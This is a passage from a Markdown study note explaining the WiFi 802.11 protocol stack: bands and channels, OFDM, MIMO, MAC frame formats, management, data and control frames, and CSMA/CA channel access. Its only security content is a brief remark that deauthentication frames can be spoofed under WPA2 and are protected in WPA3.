---
title: WiFi (802.11) Protocol Overview - Complete Stack Breakdown
tags: [WiFi, 802.11, protocol-analysis, PHY, MAC, OFDM, WPA2, WPA3, CSMA-CA]
category: WiFi Security
parent: "[[WiFi/README]]"
status: complete
---

# WiFi (802.11) Protocol Overview - Complete Stack Breakdown

> **Purpose**: Comprehensive technical breakdown of WiFi 802.11 protocol from Physical (PHY) to MAC layer, including frame structures, authentication flows, encryption mechanisms, and attack surfaces.


# **WiFi (802.11) - COMPLETE PROTOCOL BREAKDOWN**

## **1. WiFi Architecture Overview**

WiFi (IEEE 802.11) is fundamentally an **infrastructure-based** wireless LAN protocol:

```
┌─────────────────────────────────────────┐
│     APPLICATION LAYER                   │
│  (HTTP, MQTT, DNS, etc.)                │
├─────────────────────────────────────────┤
│     TRANSPORT LAYER                     │
│  (TCP, UDP)                             │
├─────────────────────────────────────────┤
│     NETWORK LAYER                       │
│  (IP, ARP, ICMP)                        │
├─────────────────────────────────────────┤
│     LLC (Logical Link Control)          │ ← 802.2
├─────────────────────────────────────────┤
│     ╔═══════════════════════════════╗   │
│     ║   802.11 MAC LAYER            ║   │
│     ║  • Management Frames          ║   │
│     ║  • Control Frames             ║   │
│     ║  • Data Frames                ║   │
│     ║  • CSMA/CA                    ║   │
│     ╠═══════════════════════════════╣   │
│     ║   802.11 PHY LAYER            ║   │
│     ║  • OFDM/DSSS/MIMO             ║   │
│     ║  • 2.4 GHz / 5 GHz / 6 GHz    ║   │
│     ╚═══════════════════════════════╝   │
└─────────────────────────────────────────┘
```

**Key Architecture Principles:**
- **Infrastructure Mode**: AP (Access Point) ↔ Stations (Clients)
- **Ad-hoc Mode**: Station ↔ Station (peer-to-peer, less common)
- **Distribution System (DS)**: Wired backbone connecting APs
- **BSS/ESS**: Basic/Extended Service Set (single AP vs multiple APs)

---

## **2. NETWORK TOPOLOGY**

### **2.1 Basic Service Set (BSS) - Single AP**

```
         ┌────────────────┐
         │   ACCESS POINT │
         │     (AP)       │
         └────────┬───────┘
                  │
    ┌─────────────┼─────────────┬─────────────┐
    │             │             │             │
    ▼             ▼             ▼             ▼
┌────────┐   ┌────────┐   ┌────────┐   ┌────────┐
│ STA 1  │   │ STA 2  │   │ STA 3  │   │ STA 4  │
│(Laptop)│   │(Phone) │   │(Tablet)│   │(IoT)   │
└────────┘   └────────┘   └────────┘   └────────┘

BSSID: AP's MAC address (e.g., AA:BB:CC:DD:EE:FF)
SSID: Network name (e.g., "MyNetwork")
```

### **2.2 Extended Service Set (ESS) - Multiple APs**

```
    Internet
       │
   ┌───┴────┐
   │ Router │
   └───┬────┘
       │
  Distribution System (Wired Ethernet)
       │
   ┌───┴────────────────────┐
   │                        │
┌──▼───┐                 ┌──▼───┐
│ AP 1 │                 │ AP 2 │
│ Ch 1 │                 │ Ch 6 │
└──┬───┘                 └──┬───┘
   │                        │
   │ WiFi                   │ WiFi
   │                        │
   ▼                        ▼
Stations                Stations

ESSID: "MyNetwork" (same for all APs)
Each AP has unique BSSID (MAC), different channels
Stations roam between APs transparently
```

### **2.3 Device Roles**

```
┌──────────────────────────────────────────────────┐
│            ACCESS POINT (AP)                     │
│  • Central coordinator                           │
│  • Broadcasts beacon frames                      │
│  • Authenticates/associates stations             │
│  • Bridges WiFi ↔ Wired network                  │
│  • Power: Mains (always on)                      │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│            STATION (STA)                         │
│  • Client devices (laptops, phones, IoT)         │
│  • Scans for networks                            │
│  • Associates with AP                            │
│  • Sends/receives data                           │
│  • Power: Battery or mains                       │
└──────────────────────────────────────────────────┘
```

---

## **3. PHYSICAL LAYER (PHY)**

### **3.1 Frequency Bands & Channels**

WiFi operates on THREE frequency bands:

```
┌────────────────────────────────────────────────────────┐
│  2.4 GHz BAND (802.11b/g/n/ax)                         │
│  ├── Frequency: 2.400 - 2.4835 GHz                     │
│  ├── Channels: 14 (11 in US, 13 in Europe, 14 in Japan)│
│  ├── Channel Width: 20 MHz (or 40 MHz for 11n+)        │
│  ├── Overlap: Channels overlap! (5 MHz spacing)        │
│  ├── Non-overlapping: 1, 6, 11 (US)                    │
│  └── Range: ~50-100m indoor                            │
│                                                         │
│  Channel Layout:                                        │
│  Ch 1:  2412 MHz (center)                              │
│  Ch 2:  2417 MHz                                        │
│  Ch 3:  2422 MHz                                        │
│  Ch 4:  2427 MHz                                        │
│  Ch 5:  2432 MHz                                        │
│  Ch 6:  2437 MHz (center)                              │
│  Ch 7:  2442 MHz                                        │
│  Ch 8:  2447 MHz                                        │
│  Ch 9:  2452 MHz                                        │
│  Ch 10: 2457 MHz                                        │
│  Ch 11: 2462 MHz (center)                              │
│  Ch 12: 2467 MHz (Europe/Japan)                        │
│  Ch 13: 2472 MHz (Europe/Japan)                        │
│  Ch 14: 2484 MHz (Japan only, 802.11b)                 │
└────────────────────────────────────────────────────────┘

OVERLAPPING CHANNELS VISUALIZATION:
     Ch 1        Ch 6         Ch 11
      │           │            │
  ┌───┴───┐   ┌───┴───┐   ┌───┴───┐
  │▓▓▓▓▓▓▓│   │▓▓▓▓▓▓▓│   │▓▓▓▓▓▓▓│
──┴───┬───┴───┴───┬───┴───┴───┬───┴──► Frequency
    Ch2-5       Ch7-10      Ch12-13
   (overlap)   (overlap)    (overlap)

┌────────────────────────────────────────────────────────┐
│  5 GHz BAND (802.11a/n/ac/ax)                          │
│  ├── Frequency: 5.150 - 5.825 GHz                      │
│  ├── Channels: ~25 non-overlapping channels            │
│  ├── Channel Width: 20/40/80/160 MHz                   │
│  ├── No overlap: All channels non-overlapping!         │
│  ├── Less congestion than 2.4 GHz                      │
│  ├── Range: ~30-50m indoor (worse penetration)         │
│  └── DFS required in some bands (radar avoidance)      │
│                                                         │
│  UNII Bands:                                            │
│  UNII-1:  Ch 36, 40, 44, 48    (5.15-5.25 GHz)         │
│  UNII-2:  Ch 52-64              (5.25-5.35 GHz) DFS!   │
│  UNII-2E: Ch 100-144            (5.47-5.725 GHz) DFS!  │
│  UNII-3:  Ch 149, 153, 157, 161 (5.725-5.825 GHz)      │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│  6 GHz BAND (802.11ax/be - WiFi 6E/7)                  │
│  ├── Frequency: 5.925 - 7.125 GHz                      │
│  ├── Channels: 59 channels (20 MHz width)              │
│  ├── Channel Width: 20/40/80/160/320 MHz               │
│  ├── Clean spectrum (no legacy devices!)               │
│  ├── Low Power Indoor (LPI) / Standard Power (SP)      │
│  └── Range: ~20-40m indoor                             │
└────────────────────────────────────────────────────────┘
```

**Why Different Bands?**
- **2.4 GHz**: Better penetration, longer range, MORE interference (crowded!)
- **5 GHz**: More channels, less interference, shorter range
- **6 GHz**: Most channels, cleanest, shortest range (newest!)

### **3.2 Modulation & Data Rates**

WiFi has evolved through multiple standards:

```
┌──────────┬──────────┬─────────────┬─────────────┬──────────┐
│ Standard │   Year   │  Frequency  │ Modulation  │ Max Rate │
├──────────┼──────────┼─────────────┼─────────────┼──────────┤
│ 802.11   │   1997   │   2.4 GHz   │ FHSS/DSSS   │  2 Mbps  │
│ 802.11b  │   1999   │   2.4 GHz   │ HR-DSSS     │ 11 Mbps  │
│ 802.11a  │   1999   │   5 GHz     │ OFDM        │ 54 Mbps  │
│ 802.11g  │   2003   │   2.4 GHz   │ OFDM        │ 54 Mbps  │
│ 802.11n  │   2009   │ 2.4/5 GHz   │ MIMO-OFDM   │ 600 Mbps │
│ (WiFi 4) │          │             │             │          │
│ 802.11ac │   2013   │   5 GHz     │ MU-MIMO     │ 6.9 Gbps │
│ (WiFi 5) │          │             │ 256-QAM     │          │
│ 802.11ax │   2019   │ 2.4/5/6 GHz │ OFDMA       │ 9.6 Gbps │
│ (WiFi 6) │          │             │ 1024-QAM    │          │
│ 802.11be │   2024   │ 2.4/5/6 GHz │ MU-MIMO     │ 46 Gbps  │
│ (WiFi 7) │          │             │ 4096-QAM    │          │
└──────────┴──────────┴─────────────┴─────────────┴──────────┘
```

### **3.3 OFDM (Orthogonal Frequency Division Multiplexing)**

Modern WiFi (802.11a/g/n/ac/ax) uses OFDM:

```
TRADITIONAL SINGLE CARRIER:
Frequency ▲
          │  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
          │  All data on one frequency
          └────────────────────────────► Time

OFDM MULTIPLE CARRIERS:
Frequency ▲
          │ ▓│▓│▓│▓│▓│▓│▓│▓│▓│▓
          │ ▓│▓│▓│▓│▓│▓│▓│▓│▓│▓  ← Subcarriers
          │ ▓│▓│▓│▓│▓│▓│▓│▓│▓│▓     (52 for 20 MHz)
          │ ▓│▓│▓│▓│▓│▓│▓│▓│▓│▓
          │  Data split across many subcarriers
          └────────────────────────────► Time

OFDM Parameters (802.11a/g):
├── 52 subcarriers (20 MHz channel)
│   ├── 48 data subcarriers
│   └── 4 pilot subcarriers (sync)
├── Subcarrier spacing: 312.5 kHz
├── Symbol duration: 4 μs
└── Guard interval: 0.8 μs (short) or 1.6 μs (long)

Benefits:
✓ Resistant to multipath interference
✓ High spectral efficiency
✓ Frequency-selective fading mitigation
```

### **3.4 Channel Bonding (802.11n+)**

```
20 MHz CHANNEL (Legacy):
┌──────────────────────┐
│    Primary Channel   │  54 Mbps (802.11g)
└──────────────────────┘

40 MHz CHANNEL (802.11n):
┌──────────────────────┬──────────────────────┐
│    Primary (P)       │   Secondary (S)      │  150 Mbps
└──────────────────────┴──────────────────────┘

80 MHz CHANNEL (802.11ac):
┌──────────┬──────────┬──────────┬──────────┐
│    P     │    S     │    S     │    S     │  433 Mbps
└──────────┴──────────┴──────────┴──────────┘

160 MHz CHANNEL (802.11ac Wave 2):
┌─────┬─────┬─────┬─────┬─────┬─────┬─────┬─────┐
│  P  │  S  │  S  │  S  │  S  │  S  │  S  │  S  │  866 Mbps+
└─────┴─────┴─────┴─────┴─────┴─────┴─────┴─────┘

Trade-off: Wider channel = Higher speed, but more interference
```

### **3.5 MIMO (Multiple Input Multiple Output)**

```
SISO (Single antenna):
AP [○] ────→ [○] STA
   1 stream

MIMO 2×2:
AP [○] ────→ [○] STA
   [○] ────→ [○]
   2 streams = 2× throughput

MIMO 4×4:
AP [○] ────→ [○] STA
   [○] ────→ [○]
   [○] ────→ [○]
   [○] ────→ [○]
   4 streams = 4× throughput

MU-MIMO (Multi-User MIMO):
AP [○]──→[○] STA1
   [○]──→[○] STA2  ← Simultaneous!
   [○]──→[○] STA3
   [○]──→[○] STA4
```

---

## **4. MAC LAYER**

### **4.1 MAC Frame Structure**

Every WiFi frame has this basic structure:

```
┌─────────────────────────────────────────────────────────┐
│                    MAC HEADER                           │
│  • Frame Control (2 bytes)                              │
│  • Duration/ID (2 bytes)                                │
│  • Address 1 (6 bytes)                                  │
│  • Address 2 (6 bytes)                                  │
│  • Address 3 (6 bytes)                                  │
│  • Sequence Control (2 bytes)                           │
│  • [Address 4] (6 bytes, optional)                      │
│  • [QoS Control] (2 bytes, optional)                    │
│  • [HT Control] (4 bytes, optional)                     │
├─────────────────────────────────────────────────────────┤
│                    FRAME BODY                           │
│  • 0-2304 bytes                                         │
│  • Management info OR Data payload                      │
├─────────────────────────────────────────────────────────┤
│                    FCS (Frame Check Sequence)           │
│  • 4 bytes (CRC-32)                                     │
└─────────────────────────────────────────────────────────┘
```

### **4.2 Frame Control Field (2 bytes / 16 bits)**

```
Bit Layout:
┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┐
│ 0 │ 1 │ 2 │ 3 │ 4 │ 5 │ 6 │ 7 │ 8 │ 9 │10 │11 │12 │13 │14 │15 │
├───┴───┼───┴───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┴───┤
│Version│ Type  │To │Frm│More│Retry│Pwr│More│WEP│Order│ Subtype│
│ (2b)  │ (2b)  │DS │DS │Frag│     │Mgt│Data│   │     │  (4b)  │
└───────┴───────┴───┴───┴────┴─────┴───┴────┴───┴─────┴────────┘

Protocol Version: 00 (always 0 for current WiFi)

Type (2 bits):
┌──────┬─────────────────────┐
│ Bits │ Frame Type          │
├──────┼─────────────────────┤
│  00  │ Management          │
│  01  │ Control             │
│  10  │ Data                │
│  11  │ Extension/Reserved  │
└──────┴─────────────────────┘

To DS / From DS:
┌────────┬─────────┬─────────────────────────┐
│ To DS  │ From DS │ Meaning                 │
├────────┼─────────┼─────────────────────────┤
│   0    │    0    │ Ad-hoc (STA ↔ STA)      │
│   0    │    1    │ From AP (AP → STA)      │
│   1    │    0    │ To AP (STA → AP)        │
│   1    │    1    │ WDS (AP ↔ AP bridge)    │
└────────┴─────────┴─────────────────────────┘

Flags:
- More Fragments: 1 = More fragments follow
- Retry: 1 = Retransmission
- Power Management: 1 = STA entering power-save
- More Data: 1 = More buffered frames for STA
- Protected Frame: 1 = Encrypted (WEP/WPA/WPA2)
- Order: 1 = Strictly ordered
```

### **4.3 Frame Types & Subtypes**

```
┌──────────────────────────────────────────────────────────┐
│              MANAGEMENT FRAMES (Type 00)                 │
├────────┬──────────┬──────────────────────────────────────┤
│Subtype │   Hex    │ Name & Purpose                       │
├────────┼──────────┼──────────────────────────────────────┤
│ 0000   │   0x00   │ Association Request                  │
│ 0001   │   0x10   │ Association Response                 │
│ 0010   │   0x20   │ Reassociation Request                │
│ 0011   │   0x30   │ Reassociation Response               │
│ 0100   │   0x40   │ Probe Request (scan)                 │
│ 0101   │   0x50   │ Probe Response                       │
│ 0110   │   0x60   │ Timing Advertisement                 │
│ 0111   │   0x70   │ Reserved                             │
│ 1000   │   0x80   │ Beacon (AP broadcasts)               │
│ 1001   │   0x90   │ ATIM (Ad-hoc)                        │
│ 1010   │   0xA0   │ Disassociation                       │
│ 1011   │   0xB0   │ Authentication                       │
│ 1100   │   0xC0   │ Deauthentication                     │
│ 1101   │   0xD0   │ Action (various purposes)            │
│ 1110   │   0xE0   │ Action No Ack                        │
│ 1111   │   0xF0   │ Reserved                             │
└────────┴──────────┴──────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│              CONTROL FRAMES (Type 01)                    │
├────────┬──────────┬──────────────────────────────────────┤
│Subtype │   Hex    │ Name & Purpose                       │
├────────┼──────────┼──────────────────────────────────────┤
│ 1010   │   0xA4   │ Power Save Poll (PS-Poll)            │
│ 1011   │   0xB4   │ RTS (Request To Send)                │
│ 1100   │   0xC4   │ CTS (Clear To Send)                  │
│ 1101   │   0xD4   │ ACK (Acknowledgment)                 │
│ 1110   │   0xE4   │ CF-End (Contention-Free End)         │
│ 1111   │   0xF4   │ CF-End + CF-Ack                      │
└────────┴──────────┴──────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│              DATA FRAMES (Type 10)                       │
├────────┬──────────┬──────────────────────────────────────┤
│Subtype │   Hex    │ Name & Purpose                       │
├────────┼──────────┼──────────────────────────────────────┤
│ 0000   │   0x08   │ Data                                 │
│ 0001   │   0x18   │ Data + CF-Ack                        │
│ 0010   │   0x28   │ Data + CF-Poll                       │
│ 0011   │   0x38   │ Data + CF-Ack + CF-Poll              │
│ 0100   │   0x48   │ Null (no data, keepalive)            │
│ 1000   │   0x88   │ QoS Data (802.11e)                   │
│ 1001   │   0x98   │ QoS Data + CF-Ack                    │
│ 1100   │   0xC8   │ QoS Null                             │
└────────┴──────────┴──────────────────────────────────────┘
```

---

## **5. MANAGEMENT FRAMES DEEP DIVE**

### **5.1 Beacon Frame**

AP broadcasts beacon frames every ~100ms (default):

```
Beacon Frame Structure:
┌─────────────────────────────────────────────────────┐
│ MAC Header:                                         │
│  ├── Frame Control: 0x0080 (Beacon)                 │
│  ├── Duration: 0                                    │
│  ├── Destination: FF:FF:FF:FF:FF:FF (Broadcast)     │
│  ├── Source: AA:BB:CC:DD:EE:FF (AP's BSSID)         │
│  ├── BSSID: AA:BB:CC:DD:EE:FF                       │
│  └── Sequence: varies                               │
├─────────────────────────────────────────────────────┤
│ Fixed Parameters:                                   │
│  ├── Timestamp (8 bytes): Microseconds since boot   │
│  ├── Beacon Interval (2 bytes): 100 TU (102.4 ms)   │
│  └── Capability Info (2 bytes): Features            │
├─────────────────────────────────────────────────────┤
│ Tagged Parameters (Information Elements):           │
│  ├── SSID (Tag 0): "MyNetwork"                      │
│  ├── Supported Rates (Tag 1): 1, 2, 5.5, 11 Mbps    │
│  ├── DS Parameter (Tag 3): Channel 6                │
│  ├── Traffic Indication Map (Tag 5): Buffered data  │
│  ├── Country Info (Tag 7): US, channels 1-11        │
│  ├── ERP Info (Tag 42): 802.11g protection          │
│  ├── Extended Rates (Tag 50): 6, 9, 12, ... Mbps    │
│  ├── RSN (Tag 48): WPA2 security info ← IMPORTANT!  │
│  ├── HT Capabilities (Tag 45): 802.11n features     │
│  ├── HT Info (Tag 61): 802.11n channel info         │
│  ├── VHT Capabilities (Tag 191): 802.11ac features  │
│  ├── VHT Operation (Tag 192): 802.11ac channel      │
│  └── Vendor Specific (Tag 221): OUI-specific data   │
└─────────────────────────────────────────────────────┘

EXAMPLE BEACON (Hex):
80 00  00 00  FF FF FF FF FF FF  AA BB CC DD EE FF
│  │   │  │   └─ Destination (broadcast)
│  │   │  └─ Duration
│  │   └─ Type: Management, Subtype: Beacon
│  └─ Frame Control
└─ Protocol Version

AA BB CC DD EE FF  10 20  3A 4B 5C 6D 7E 8F 00 00
└─ BSSID           └─Seq  └─ Timestamp (8 bytes)

64 00  11 04  00 0B 4D 79 4E 65 74 77 6F 72 6B
│  │   │  │   │  └─ SSID: "MyNetwork"
│  │   │  │   └─ SSID Length: 11
│  │   │  └─ SSID Tag
│  │   └─ Capability Info
│  └─ Beacon Interval (100 TU)
```

**Capability Info Breakdown:**
```
┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┐
│ 0 │ 1 │ 2 │ 3 │ 4 │ 5 │ 6 │ 7 │ 8 │ 9 │10 │11 │12 │13 │14 │15 │
├───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┼───┤
│ESS│IBSS│CF│CF│Priv│Short│PBCC│Ch│Spec│QoS│Short│APSD│Radio│DSSS│Del│Res│
│   │   │Pol│Req│acy│Pream│    │Agl│Mgmt│   │Slot│    │Meas │OFDM│BA │   │
└───┴───┴───┴───┴───┴────┴────┴───┴────┴───┴────┴────┴─────┴────┴───┴───┘

ESS: 1 = Infrastructure mode (AP present)
Privacy: 1 = Encryption required (WEP/WPA/WPA2)
Short Preamble: 1 = 802.11b short preamble supported
```

### **5.2 Probe Request/Response**

Client scans for networks:

```
ACTIVE SCAN PROCESS:

Station                                 Access Point
   │                                          │
   │─── Probe Request (Broadcast) ───────────→│
   │    SSID: "" (wildcard) or "MyNetwork"    │
   │    Channel: 1                            │
   │                                          │
   │←── Probe Response ───────────────────────│
   │    SSID: "MyNetwork"                     │
   │    BSSID: AA:BB:CC:DD:EE:FF              │
   │    Capabilities, Rates, Channel, etc.    │
   │                                          │
   │    (Station moves to Channel 2...)       │
   │                                          │
   │─── Probe Request (Broadcast) ───────────→│
   │    Channel: 2                            │
   │    ...                                   │

Probe Request Frame:
┌─────────────────────────────────────────────────────┐
│ MAC Header:                                         │
│  ├── Frame Control: 0x0040 (Probe Request)          │
│  ├── Destination: FF:FF:FF:FF:FF:FF (Broadcast)     │
│  ├── Source: 11:22:33:44:55:66 (Client MAC)         │
│  └── BSSID: FF:FF:FF:FF:FF:FF (Wildcard)            │
├─────────────────────────────────────────────────────┤
│ Tagged Parameters:                                  │
│  ├── SSID: "" (broadcast) or "TargetNetwork"        │
│  ├── Supported Rates                                │
│  ├── Extended Rates                                 │
│  ├── DS Parameter Set (current channel)             │
│  ├── HT Capabilities (802.11n)                      │
│  └── VHT Capabilities (802.11ac)                    │
└─────────────────────────────────────────────────────┘
```

### **5.3 Authentication**

```
OPEN SYSTEM AUTHENTICATION (No encryption):

Station                                 Access Point
   │                                          │
   │─── Authentication Request ──────────────→│
   │    Algorithm: Open System (0)            │
   │    Transaction Seq: 1                    │
   │                                          │
   │←── Authentication Response ──────────────│
   │    Algorithm: Open System (0)            │
   │    Transaction Seq: 2                    │
   │    Status: Success (0x0000)              │
   │                                          │

SHARED KEY AUTHENTICATION (WEP - DEPRECATED):

Station                                 Access Point
   │                                          │
   │─── Auth Request (Seq 1) ────────────────→│
   │                                          │
   │←── Auth Challenge (Seq 2) ───────────────│
   │    Challenge Text (128 bytes)            │
   │                                          │
   │─── Auth Response (Seq 3) ────────────────→│
   │    Encrypted Challenge (with WEP key)    │
   │                                          │
   │←── Auth Success/Fail (Seq 4) ────────────│
   │                                          │

Authentication Frame:
┌─────────────────────────────────────────────────────┐
│ MAC Header:                                         │
│  ├── Frame Control: 0x00B0 (Authentication)         │
│  ├── Destination: AA:BB:CC:DD:EE:FF (AP)            │
│  ├── Source: 11:22:33:44:55:66 (Client)             │
│  └── BSSID: AA:BB:CC:DD:EE:FF (AP)                  │
├─────────────────────────────────────────────────────┤
│ Fixed Parameters:                                   │
│  ├── Auth Algorithm: 0 (Open) or 1 (Shared Key)     │
│  ├── Auth Transaction Seq: 1-4                      │
│  ├── Status Code: 0x0000 = Success                  │
│  └── Challenge Text (optional, for Shared Key)      │
└─────────────────────────────────────────────────────┘
```

### **5.4 Association**

```
ASSOCIATION PROCESS:

Station                                 Access Point
   │                                          │
   │─── Association Request ─────────────────→│
   │    Listen Interval: 10 beacons           │
   │    SSID: "MyNetwork"                     │
   │    Supported Rates                       │
   │    Capabilities                          │
   │                                          │
   │←── Association Response ─────────────────│
   │    Status: Success (0x0000)              │
   │    AID (Association ID): 1               │
   │    Supported Rates                       │
   │                                          │
   │  [Station now associated, can send data] │

Association Request Frame:
┌─────────────────────────────────────────────────────┐
│ MAC Header:                                         │
│  ├── Frame Control: 0x0000 (Association Request)    │
│  ├── Destination: AA:BB:CC:DD:EE:FF (AP)            │
│  ├── Source: 11:22:33:44:55:66 (Client)             │
│  └── BSSID: AA:BB:CC:DD:EE:FF (AP)                  │
├─────────────────────────────────────────────────────┤
│ Fixed Parameters:                                   │
│  ├── Capability Info (2 bytes)                      │
│  └── Listen Interval (2 bytes): 10 beacon intervals │
├─────────────────────────────────────────────────────┤
│ Tagged Parameters:                                  │
│  ├── SSID: "MyNetwork"                              │
│  ├── Supported Rates                                │
│  ├── Extended Rates                                 │
│  ├── Power Capability                               │
│  ├── Supported Channels                             │
│  ├── RSN (WPA2 info) ← Security negotiation!        │
│  ├── HT Capabilities                                │
│  └── VHT Capabilities                               │
└─────────────────────────────────────────────────────┘

Association Response Frame:
┌─────────────────────────────────────────────────────┐
│ MAC Header (similar structure)                      │
├─────────────────────────────────────────────────────┤
│ Fixed Parameters:                                   │
│  ├── Capability Info                                │
│  ├── Status Code: 0x0000 (Success)                  │
│  └── AID (Association ID): 0xC001 (AID=1)           │
├─────────────────────────────────────────────────────┤
│ Tagged Parameters:                                  │
│  ├── Supported Rates                                │
│  ├── Extended Rates                                 │
│  ├── EDCA Parameters (QoS)                          │
│  ├── HT Capabilities & Operation                    │
│  └── VHT Capabilities & Operation                   │
└─────────────────────────────────────────────────────┘

AID (Association ID):
- 16-bit value with bits 14-15 set to 1
- Example: 0xC001 = AID 1, 0xC002 = AID 2
- Used for power-save buffering and group addressing
```

### **5.5 Deauthentication & Disassociation**

```
DEAUTHENTICATION FRAME:
┌─────────────────────────────────────────────────────┐
│ MAC Header:                                         │
│  ├── Frame Control: 0x00C0 (Deauthentication)       │
│  ├── Destination: 11:22:33:44:55:66 (Client)        │
│  ├── Source: AA:BB:CC:DD:EE:FF (AP)                 │
│  └── BSSID: AA:BB:CC:DD:EE:FF (AP)                  │
├─────────────────────────────────────────────────────┤
│ Fixed Parameters:                                   │
│  └── Reason Code (2 bytes)                          │
└─────────────────────────────────────────────────────┘

Common Reason Codes:
┌──────┬────────────────────────────────────────────┐
│ Code │ Reason                                     │
├──────┼────────────────────────────────────────────┤
│ 0x01 │ Unspecified reason                         │
│ 0x02 │ Previous authentication no longer valid    │
│ 0x03 │ Deauthenticated leaving (STA is leaving)   │
│ 0x04 │ Disassociated due to inactivity            │
│ 0x05 │ AP unable to handle all STAs               │
│ 0x06 │ Class 2 frame from non-authenticated STA   │
│ 0x07 │ Class 3 frame from non-associated STA      │
│ 0x08 │ Disassociated because STA is leaving       │
│ 0x09 │ STA requesting (re)association not auth    │
└──────┴────────────────────────────────────────────┘

CRITICAL SECURITY NOTE:
Deauth/Disassoc frames are NOT authenticated in WPA2!
→ Easy to spoof (Deauth Attack vulnerability)
→ Fixed in WPA3 with Protected Management Frames (PMF)
```

---

## **6. DATA FRAMES**

### **6.1 Data Frame Structure**

```
DATA FRAME:
┌─────────────────────────────────────────────────────┐
│ MAC Header:                                         │
│  ├── Frame Control: 0x0208 (QoS Data, To DS)        │
│  ├── Duration: varies                               │
│  ├── Address 1: AA:BB:CC:DD:EE:FF (BSSID/AP)        │
│  ├── Address 2: 11:22:33:44:55:66 (Source/Client)   │
│  ├── Address 3: 99:88:77:66:55:44 (Dest/Server)     │
│  ├── Sequence Control: varies                       │
│  └── QoS Control: 0x0000 (Priority, TID)            │
├─────────────────────────────────────────────────────┤
│ LLC/SNAP Header (8 bytes):                          │
│  ├── DSAP: 0xAA (SNAP)                              │
│  ├── SSAP: 0xAA (SNAP)                              │
│  ├── Control: 0x03 (Unnumbered)                     │
│  ├── OUI: 0x000000 (Ethernet)                       │
│  └── Type: 0x0800 (IPv4) or 0x0806 (ARP)            │
├─────────────────────────────────────────────────────┤
│ Data Payload (Encrypted if WPA2):                   │
│  └── IP packet, ARP, etc.                           │
└─────────────────────────────────────────────────────┘
```

### **6.2 Address Fields (The 3-Address System)**

```
ADDRESSING IN INFRASTRUCTURE MODE:

STA → AP (To DS = 1, From DS = 0):
┌──────────┬────────────────────────────────┐
│ Address  │ Meaning                        │
├──────────┼────────────────────────────────┤
│ Addr 1   │ Receiver (AP's BSSID)          │
│ Addr 2   │ Transmitter (STA's MAC)        │
│ Addr 3   │ Destination (final dest MAC)   │
└──────────┴────────────────────────────────┘

AP → STA (To DS = 0, From DS = 1):
┌──────────┬────────────────────────────────┐
│ Address  │ Meaning                        │
├──────────┼────────────────────────────────┤
│ Addr 1   │ Receiver (STA's MAC)           │
│ Addr 2   │ Transmitter (AP's BSSID)       │
│ Addr 3   │ Source (original source MAC)   │
└──────────┴────────────────────────────────┘

EXAMPLE: Client (11:22:33:44:55:66) → Server (99:88:77:66:55:44)
         via AP (AA:BB:CC:DD:EE:FF)

Client → AP:
  Addr1: AA:BB:CC:DD:EE:FF (AP)
  Addr2: 11:22:33:44:55:66 (Client)
  Addr3: 99:88:77:66:55:44 (Server)

AP → Server (on wired network):
  Ethernet Src: AA:BB:CC:DD:EE:FF (AP)
  Ethernet Dst: 99:88:77:66:55:44 (Server)

Server → AP (on wired network):
  Ethernet Src: 99:88:77:66:55:44 (Server)
  Ethernet Dst: AA:BB:CC:DD:EE:FF (AP)

AP → Client:
  Addr1: 11:22:33:44:55:66 (Client)
  Addr2: AA:BB:CC:DD:EE:FF (AP)
  Addr3: 99:88:77:66:55:44 (Server)
```

---

## **7. CONTROL FRAMES**

### **7.1 ACK Frame**

```
Every unicast frame must be ACKed:

Station                                 Access Point
   │                                          │
   │─── Data Frame ──────────────────────────→│
   │                                          │
   │    [SIFS = 10 μs]                        │
   │                                          │
   │←── ACK ──────────────────────────────────│
   │                                          │

No ACK received? Retransmit!

ACK Frame Structure:
┌─────────────────────────────────────────────────────┐
│ Frame Control: 0x00D4 (ACK)                         │
│ Duration: 0                                         │
│ Receiver Address: 11:22:33:44:55:66                 │
│ FCS: XX XX XX XX                                    │
└─────────────────────────────────────────────────────┘

Total ACK length: 14 bytes (very short!)
```

### **7.2 RTS/CTS (Request To Send / Clear To Send)**

Used to avoid hidden node problem:

```
HIDDEN NODE PROBLEM:

Station A ◄────────► AP ◄────────► Station B
(can't hear B)                    (can't hear A)

If A and B transmit simultaneously → collision at AP!

SOLUTION: RTS/CTS

Station A                 AP                  Station B
   │                      │                        │
   │─── RTS ─────────────→│                        │
   │    Duration: 300 μs  │                        │
   │                      │                        │
   │                      │←── CTS ────────────────│
   │←─── CTS ─────────────│    Duration: 250 μs    │
   │    Duration: 250 μs  │    (B hears CTS,       │
   │                      │     defers TX)         │
   │                      │                        │
   │─── Data ────────────→│                        │
   │                      │                        │
   │←── ACK ──────────────│                        │
   │                      │                        │

RTS/CTS adds overhead, typically used for large frames only
Threshold: Usually >2347 bytes
```

---

## **8. CSMA/CA (Carrier Sense Multiple Access with Collision Avoidance)**

WiFi uses CSMA/CA (NOT CSMA/CD like Ethernet):

```
CHANNEL ACCESS MECHANISM:

1. CARRIER SENSE:
   ┌─────────────────────────────────────────┐
   │ Physical Carrier Sense (PHY)            │
   │ → Detect energy on channel              │
   │ → Threshold: -82 dBm (typical)          │
   └─────────────────────────────────────────┘
   ┌─────────────────────────────────────────┐
   │ Virtual Carrier Sense (NAV)             │
   │ → Duration field in overheard frames    │
   │ → Network Allocation Vector             │
   └─────────────────────────────────────────┘

2. BACKOFF ALGORITHM:
   If channel busy:
   ├── Pick random backoff: 0 to (CW - 1) slots
   │   CW (Contention Window): starts at CWmin
   │   CWmin = 15 (802.11b/g)
   │   CWmax = 1023
   ├── Decrement counter when channel idle
   ├── Freeze counter when channel busy
   └── Transmit when counter reaches 0

3. COLLISION HANDLING:
   No ACK received?
   ├── Double contention window: CW = CW * 2
   ├── Max retries: 7 (short frames) or 4 (long frames)
   └── If max retries exceeded → drop frame

TIMING INTERVALS:
┌──────────────────┬─────────┬──────────────────┐
│ Interval         │ 802.11b │ 802.11a/g/n/ac   │
├──────────────────┼─────────┼──────────────────┤
